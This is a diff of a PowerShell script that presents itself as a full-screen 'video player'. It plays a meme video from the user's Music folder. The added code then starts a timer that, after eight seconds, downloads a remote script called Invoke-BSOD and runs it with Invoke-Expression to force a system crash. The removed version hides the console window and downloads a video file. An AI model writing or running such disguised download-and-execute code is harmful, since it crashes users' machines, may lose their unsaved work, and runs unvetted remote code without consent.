@@ -1,36 +1,44 @@
-# Function to minimize PowerShell window
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-function Minimize-Window {
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    [Console.Window]::ShowWindow($consolePtr, 6) # Minimize
-}
+#WPF Library for Playing Movie and some components
+Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName System.ComponentModel
 
-# Minimize PowerShell window
-Minimize-Window
+#XAML File of WPF as windows for playing movie
+[xml]$XAML = @"
+<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="PowerShell Video Player" WindowStyle="None" WindowState="Maximized">
+    <Grid>
+        <MediaElement Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"/>
+    </Grid>
+</Window>
+"@
 
-# Change directory to Music
-Set-Location -Path $env:USERPROFILE\Music
+#Movie Path
+$MusicFolder = [Environment]::GetFolderPath("MyMusic")
+$VideoSource = Join-Path $MusicFolder "NiceComputer.mp4"
 
-# Download the video file
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"
+#Devide All Objects on XAML
+$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
+$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
+$VideoPlayer = $Window.FindName("VideoPlayer")
 
-# Play the video
-$mediaPlayer = New-Object -ComObject WMPlayer.OCX
-$mediaPlayer.URL = "NiceComputer.mp4"
-$mediaPlayer.controls.play()
+#Video Default Setting
+$VideoPlayer.Volume = 100
+$VideoPlayer.Source = $VideoSource
+$VideoPlayer.Play()
 
-# Introduce delay to allow media player to start playing
-Start-Sleep -Seconds 2
+#Timer for countdown
+$Timer = New-Object System.Windows.Threading.DispatcherTimer
+$Timer.Interval = [TimeSpan]::FromSeconds(8)
+$Timer.Add_Tick({
+    $Timer.Stop()
+    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+})
 
-# Monitor video playback status
-do {
-    Start-Sleep -Seconds 1
-} until ($mediaPlayer.playState -eq 0) # playState 0 represents stopped state
+#Start the countdown timer after the video starts playing
+$VideoPlayer.Add_Loaded({
+    $Timer.Start()
+})
 
-# Play sound effect
-(New-Object Media.SoundPlayer "C:\Users\anson\Music\Vine_Boom_sound_effect_meme.wav").Play()
+#Show Up the Window 
+$Window.ShowDialog() | Out-Null
